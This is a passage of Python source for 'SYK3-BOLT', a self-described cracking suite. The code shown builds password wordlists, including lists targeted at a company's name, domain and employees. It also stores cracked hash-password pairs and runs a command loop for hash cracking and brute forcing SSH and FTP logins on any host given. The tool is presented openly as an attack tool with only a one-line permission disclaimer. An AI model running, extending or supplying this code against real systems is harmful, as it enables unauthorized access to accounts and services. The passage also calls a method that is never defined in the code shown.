                for i in range(10):
                    words.add(word + str(i))
                    words.add(str(i) + word)
                    words.add(word + str(i) + str(i))
                
                # Add years
                words.add(word + '2023')
                words.add(word + '2024')
                words.add(word + '2025')
        
        # Add leet speak variations
        if leet_speak:
            leet_map = {
                'a': ['4', '@'],
                'e': ['3'],
                'i': ['1', '!'],
                'o': ['0'],
                's': ['5', '$'],
                't': ['7'],
                'b': ['8'],
                'g': ['9'],
                'l': ['1']
            }
            
            leet_words = set()
            for word in words:
                if len(word) > 2:
                    leet_word = word
                    for char, replacements in leet_map.items():
                        if char in leet_word.lower():
                            for replacement in replacements:
                                leet_words.add(leet_word.replace(char, replacement))
                                leet_words.add(leet_word.replace(char.upper(), replacement))
            
            words.update(leet_words)
        
        # Filter by length
        words = {w for w in words if min_len <= len(w) <= max_len}
        
        # Save to file
        with open(output_file, 'w', encoding='utf-8') as f:
            for word in sorted(words):
                f.write(word + '\n')
        
        # Calculate stats
        stats = WordlistStats(
            path=output_file,
            total_lines=len(words),
            unique_lines=len(words),
            average_length=sum(len(w) for w in words) / len(words) if words else 0,
            min_length=min(len(w) for w in words) if words else 0,
            max_length=max(len(w) for w in words) if words else 0,
            common_patterns={}
        )
        
        return stats
    
    @staticmethod
    def generate_from_pattern(pattern: str, output_file: str,
                             charset: str = string.ascii_lowercase) -> WordlistStats:
        """Generate wordlist from pattern (e.g., "???##" for 3 letters + 2 digits)"""
        # Parse pattern
        charsets = []
        for char in pattern:
            if char == '?':
                charsets.append(string.ascii_lowercase)
            elif char == '#':
                charsets.append(string.digits)
            elif char == '@':
                charsets.append(string.ascii_uppercase)
            elif char == '!':
                charsets.append('!@#$%^&*')
            elif char == '*':
                charsets.append(string.ascii_letters + string.digits)
            else:
                charsets.append(char)
        
        # Generate combinations
        words = set()
        total = 1
        for cs in charsets:
            if isinstance(cs, str):
                total *= len(cs)
            else:
                total *= 1
        
        print(f"{Colors.YELLOW}[*] Generating {total:,} combinations...{Colors.RESET}")
        
        generated = 0
        chunk_size = min(1000000, total)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            for combination in itertools.product(*charsets):
                word = ''.join(combination)
                f.write(word + '\n')
                generated += 1
                
                if generated % chunk_size == 0:
                    progress = (generated / total) * 100
                    print(f"{Colors.CYAN}[+] Generated {generated:,} ({progress:.1f}%){Colors.RESET}")
        
        stats = WordlistStats(
            path=output_file,
            total_lines=generated,
            unique_lines=generated,
            average_length=len(pattern),
            min_length=len(pattern),
            max_length=len(pattern),
            common_patterns={'pattern': pattern}
        )
        
        return stats
    
    @staticmethod
    def generate_from_company(company_name: str, output_file: str,
                             domain: str = None, employees: List[str] = None) -> WordlistStats:
        """Generate wordlist from company information"""
        keywords = [company_name]
        
        # Add domain
        if domain:
            keywords.append(domain)
            keywords.append(domain.split('.')[0])
        
        # Add employee names
        if employees:
            for emp in employees:
                keywords.append(emp)
                keywords.append(emp.split()[0] if ' ' in emp else emp)
        
        # Add common company terms
        company_terms = [
            'admin', 'password', 'pass', 'login', 'welcome',
            'company', 'corp', 'inc', 'ltd', 'llc',
            'server', 'network', 'secure', 'security',
            'it', 'support', 'helpdesk', 'root',
            'backup', 'temp', 'test', 'dev', 'prod'
        ]
        keywords.extend(company_terms)
        
        return WordlistGenerator.generate_from_keywords(
            keywords, output_file,
            min_len=4, max_len=20,
            include_numbers=True,
            include_special=True,
            leet_speak=True
        )

# =====================
# HASH DATABASE
# =====================
class HashDatabase:
    """Database of known hash-password pairs"""
    
    def __init__(self, db_path: str = "hash_db.sqlite"):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        """Initialize database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS hashes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hash_string TEXT NOT NULL,
                hash_type TEXT NOT NULL,
                password TEXT NOT NULL,
                source TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(hash_string, hash_type)
            )
        ''')
        
        cursor.execute('''
            CREATE INDEX IF NOT EXISTS idx_hash_string 
            ON hashes(hash_string)
        ''')
        
        conn.commit()
        conn.close()
    
    def add(self, hash_string: str, hash_type: str, password: str, source: str = None):
        """Add hash-password pair to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO hashes 
                (hash_string, hash_type, password, source)
                VALUES (?, ?, ?, ?)
            ''', (hash_string.lower(), hash_type, password, source))
            conn.commit()
        except Exception as e:
            print(f"{Colors.RED}[!] Database error: {e}{Colors.RESET}")
        finally:
            conn.close()
    
    def lookup(self, hash_string: str) -> Optional[Tuple[str, str]]:
        """Look up hash in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT password, hash_type FROM hashes 
            WHERE hash_string = ?
        ''', (hash_string.lower(),))
        
        result = cursor.fetchone()
        conn.close()
        
        return result if result else None
    
    def import_from_file(self, filename: str, hash_type: str, source: str = None):
        """Import hash:password pairs from file"""
        count = 0
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    hash_str, password = line.split(':', 1)
                    self.add(hash_str.strip(), hash_type, password.strip(), source)
                    count += 1
        
        return count

# =====================
# MAIN APPLICATION
# =====================
class Syk3Bolt:
    """Main SYK3-BOLT application"""
    
    def __init__(self):
        self.cracker = PasswordCracker()
        self.ssh_cracker = SSHCracker()
        self.ftp_cracker = FTPCracker()
        self.http_cracker = HTTPCracker()
        self.wordlist_gen = WordlistGenerator()
        self.hash_db = HashDatabase()
        self.results_dir = "crack_results"
        Path(self.results_dir).mkdir(exist_ok=True)
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════╗
║{Colors.NEON}              🦅 SYK3-BOLT v1.0.0 - Advanced Cracking Suite               {Colors.GREEN}║
╠═══════════════════════════════════════════════════════════════════════════╣
║{Colors.CYAN}  • 🔓 Hash Cracking       • 🔑 SSH/RDP Cracking   • 📧 Email Cracking    {Colors.GREEN}║
║{Colors.CYAN}  • 💣 Brute Force         • 📝 Dictionary Attacks • 🎯 Wordlist Generation{Colors.GREEN}║
║{Colors.CYAN}  • 🚀 GPU Acceleration    • 🔍 Hash Detection     • 📊 Rainbow Tables    {Colors.GREEN}║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.YELLOW}⚠️  LEGAL DISCLAIMER: Use only on systems you own or have permission to test!{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        """Print help information"""
        help_text = f"""
{Colors.NEON}┌───────────────── SYK3-BOLT COMMANDS ─────────────────┐{Colors.RESET}

{Colors.GREEN}🔓 HASH CRACKING COMMANDS:{Colors.RESET}
  crack_hash <hash>                 - Crack a hash (auto-detect type)
  crack_hash_method <hash> <method>  - Use specific method (dictionary/bruteforce/mask/hybrid)
  detect_hash <hash>                 - Detect hash type and info
  hash_lookup <hash>                  - Look up hash in database

{Colors.GREEN}🔑 SERVICE CRACKING:{Colors.RESET}
  crack_ssh <host> <user> <wordlist>   - Crack SSH password
  crack_ftp <host> <user> <wordlist>   - Crack FTP password
  crack_http <url> <user> <wordlist>   - Crack HTTP form authentication
  crack_rdp <host> <user> <wordlist>   - Crack RDP (requires crowbar/theharvester)

{Colors.GREEN}📝 WORDLIST GENERATION:{Colors.RESET}
  gen_wordlist_keywords <keywords> <output>   - Generate from keywords
  gen_wordlist_pattern <pattern> <output>     - Generate from pattern (e.g., "???##")
  gen_wordlist_company <company> <output>      - Generate from company info
  gen_wordlist_stats <wordlist>                - Show wordlist statistics

{Colors.GREEN}💾 HASH DATABASE:{Colors.RESET}
  hash_db_add <hash> <type> <password>         - Add to database
  hash_db_import <file> <type>                  - Import hash:pass file
  hash_db_stats                                 - Database statistics

{Colors.GREEN}⚙️  ADVANCED OPTIONS:{Colors.RESET}
  set_threads <number>                         - Set number of threads
  set_gpu <on/off>                              - Enable/disable GPU acceleration
  show_config                                   - Show current configuration

{Colors.GREEN}📊 EXAMPLES:{Colors.RESET}
  crack_hash 5f4dcc3b5aa765d61d8327deb882cf99   - Crack MD5 hash
  crack_ssh 192.168.1.100 root rockyou.txt      - Crack SSH
  gen_wordlist_keywords "admin,password" custom.txt
  gen_wordlist_pattern "????##" pin_list.txt

{Colors.NEON}└──────────────────────────────────────────────────────┘{Colors.RESET}
        """
        print(help_text)
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Check for required dependencies
        if not CRYPTO_AVAILABLE:
            print(f"{Colors.YELLOW}[!] pycryptodome not installed. Install: pip install pycryptodome{Colors.RESET}")
        
        if not PARAMIKO_AVAILABLE:
            print(f"{Colors.YELLOW}[!] paramiko not installed. Install: pip install paramiko{Colors.RESET}")
        
        if CUDA_AVAILABLE:
            print(f"{Colors.GREEN}[+] GPU acceleration available{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[-] GPU acceleration not available (install cupy for CUDA){Colors.RESET}")
        
        print(f"\n{Colors.CYAN}[*] Type 'help' for commands or 'exit' to quit{Colors.RESET}\n")
        
        while True:
            try:
                cmd = input(f"{Colors.NEON}┌─[{Colors.GREEN}SYK3-BOLT{Colors.NEON}]─[{Colors.CYAN}{os.getcwd()}{Colors.NEON}]\n└──╼ {Colors.RESET}").strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                args = parts[1:]
                
                if command == 'exit' or command == 'quit':
                    print(f"{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                    break
                
                elif command == 'help':
                    self.print_help()
                
                elif command == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                
                elif command == 'detect_hash':
                    if not args:
                        print(f"{Colors.RED}[!] Usage: detect_hash <hash>{Colors.RESET}")
                        continue
                    
                    hash_info = HashDetector.detect(args[0])
                    print(f"\n{Colors.NEON}[+] Hash Analysis:{Colors.RESET}")
                    print(f"  Hash: {hash_info.hash_string[:32]}...")
                    print(f"  Length: {hash_info.length}")
                    print(f"  Type: {hash_info.hash_type}")
                    print(f"  Valid: {'Yes' if hash_info.is_valid else 'No'}")
                    print(f"  Possible Algorithms: {', '.join(hash_info.possible_algorithms)}")
                
                elif command == 'crack_hash':
                    if not args:
                        print(f"{Colors.RED}[!] Usage: crack_hash <hash> [method]{Colors.RESET}")
                        continue
                    
                    hash_string = args[0]
                    method = args[1] if len(args) > 1 else 'dictionary'
                    
                    # Check database first
                    db_result = self.hash_db.lookup(hash_string)
                    if db_result:
                        print(f"{Colors.GREEN}[+] Found in database: {db_result[0]}{Colors.RESET}")
                        continue
                    
                    result = self.cracker.crack_hash(hash_string, method)
                    
                    if result.success:
                        print(f"\n{Colors.GREEN}✅ PASSWORD FOUND!{Colors.RESET}")
                        print(f"  Password: {Colors.YELLOW}{result.password}{Colors.RESET}")
                        print(f"  Method: {result.method}")
                        print(f"  Hash Type: {result.hash_type}")
                        print(f"  Time: {result.time_taken:.2f}s")
                        print(f"  Attempts: {result.attempts:,}")
                        
                        # Save to database
                        hash_info = HashDetector.detect(hash_string)
                        self.hash_db.add(hash_string, result.hash_type or hash_info.hash_type,
                                       result.password, 'cracked')
                    else:
                        print(f"\n{Colors.RED}❌ Password not found{Colors.RESET}")
                        print(f"  Error: {result.error}")
                        print(f"  Time: {result.time_taken:.2f}s")
                        print(f"  Attempts: {result.attempts:,}")
                
                elif command == 'crack_hash_method':
                    if len(args) < 2:
                        print(f"{Colors.RED}[!] Usage: crack_hash_method <hash> <method>{Colors.RESET}")
                        print(f"  Methods: dictionary, bruteforce, mask, hybrid")
                        continue
                    
                    self.process_command(f"crack_hash {args[0]} {args[1]}")
                
                elif command == 'crack_ssh':
                    if len(args) < 3:
                        print(f"{Colors.RED}[!] Usage: crack_ssh <host> <username> <wordlist>{Colors.RESET}")
                        continue
                    
                    host = args[0]
                    username = args[1]
                    wordlist = args[2]
                    port = 22
                    
                    results = self.ssh_cracker.crack(host, port, username, wordlist)
                    
                    # Save results
                    if results:
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"{self.results_dir}/ssh_{host}_{timestamp}.json"
                        with open(filename, 'w') as f:
                            json.dump([asdict(r) for r in results], f, indent=2)
                        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.RESET}")
                
                elif command == 'crack_ftp':
                    if len(args) < 3:
                        print(f"{Colors.RED}[!] Usage: crack_ftp <host> <username> <wordlist>{Colors.RESET}")
                        continue
                    
                    host = args[0]
                    username = args[1]
                    wordlist = args[2]
                    port = 21
                    
                    results = self.ftp_cracker.crack(host, port, username, wordlist)
                    
                    if results:
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"{self.results_dir}/ftp_{host}_{timestamp}.json"
                        with open(filename, 'w') as f:
                            json.dump([asdict(r) for r in results], f, indent=2)
                        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.RESET}")
                
                elif command == 'gen_wordlist_keywords':
                    if len(args) < 2:
                        print(f"{Colors.RED}[!] Usage: gen_wordlist_keywords <keywords> <output>{Colors.RESET}")
                        print(f"  Keywords should be comma-separated (e.g., 'admin,password,company')")
                        continue
                    
                    keywords = args[0].split(',')
                    output = args[1]
                    
                    stats = self.wordlist_gen.generate_from_keywords(keywords, output)
                    
                    print(f"\n{Colors.GREEN}[+] Wordlist generated: {output}{Colors.RESET}")
                    print(f"  Total lines: {stats.total_lines:,}")
                    print(f"  Average length: {stats.average_length:.1f}")
                    print(f"  Min length: {stats.min_length}")
                    print(f"  Max length: {stats.max_length}")
                
                elif command == 'gen_wordlist_pattern':
                    if len(args) < 2:
                        print(f"{Colors.RED}[!] Usage: gen_wordlist_pattern <pattern> <output>{Colors.RESET}")
                        print(f"  Pattern symbols: ?=lowercase, #=digits, @=uppercase, !=special, *=all")
                        print(f"  Example: '???##' = 3 letters + 2 digits")
                        continue
                    
                    pattern = args[0]
                    output = args[1]
                    
                    stats = self.wordlist_gen.generate_from_pattern(pattern, output)
                    
                    print(f"\n{Colors.GREEN}[+] Wordlist generated: {output}{Colors.RESET}")
                    print(f"  Total lines: {stats.total_lines:,}")
                
                elif command == 'hash_lookup':
                    if not args:
                        print(f"{Colors.RED}[!] Usage: hash_lookup <hash>{Colors.RESET}")
                        continue
                    
                    result = self.hash_db.lookup(args[0])
                    if result:
                        print(f"{Colors.GREEN}[+] Found: {result[0]} ({result[1]}){Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}[-] Hash not found in database{Colors.RESET}")
                
                elif command == 'hash_db_add':
                    if len(args) < 3:
                        print(f"{Colors.RED}[!] Usage: hash_db_add <hash> <type> <password>{Colors.RESET}")
                        continue
                    
                    self.hash_db.add(args[0], args[1], args[2])
                    print(f"{Colors.GREEN}[+] Hash added to database{Colors.RESET}")
                
                elif command == 'hash_db_stats':
                    # Simple stats for now
                    print(f"{Colors.YELLOW}[*] Database stats coming soon...{Colors.RESET}")
                
                elif command == 'set_threads':
                    if not args:
                        print(f"{Colors.RED}[!] Usage: set_threads <number>{Colors.RESET}")
                        continue
                    
                    try:
                        threads = int(args[0])
                        self.cracker.threads = threads
                        self.ssh_cracker.threads = threads
                        self.ftp_cracker.threads = threads
                        self.http_cracker.threads = threads
                        print(f"{Colors.GREEN}[+] Threads set to {threads}{Colors.RESET}")
                    except ValueError:
                        print(f"{Colors.RED}[!] Invalid number{Colors.RESET}")
                
                elif command == 'set_gpu':
                    if not args:
                        print(f"{Colors.RED}[!] Usage: set_gpu <on/off>{Colors.RESET}")
                        continue
                    
                    if args[0].lower() == 'on':
                        if CUDA_AVAILABLE:
                            self.cracker.use_gpu = True
                            print(f"{Colors.GREEN}[+] GPU acceleration enabled{Colors.RESET}")
                        else:
                            print(f"{Colors.RED}[!] GPU acceleration not available{Colors.RESET}")
                    else:
                        self.cracker.use_gpu = False
                        print(f"{Colors.YELLOW}[-] GPU acceleration disabled{Colors.RESET}")
                
                elif command == 'show_config':
                    print(f"\n{Colors.NEON}[+] Current Configuration:{Colors.RESET}")
                    print(f"  Threads: {self.cracker.threads}")
                    print(f"  GPU: {'Enabled' if self.cracker.use_gpu else 'Disabled'}")
                    print(f"  CUDA Available: {'Yes' if CUDA_AVAILABLE else 'No'}")
                    print(f"  Results Directory: {self.results_dir}")
                
                else:
                    print(f"{Colors.RED}[!] Unknown command. Type 'help' for available commands.{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}⚠️  Interrupted{Colors.RESET}")
                continue
            
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
                import traceback
                traceback.print_exc()

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        # Create application
        app = Syk3Bolt()
        
        # Run main loop
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()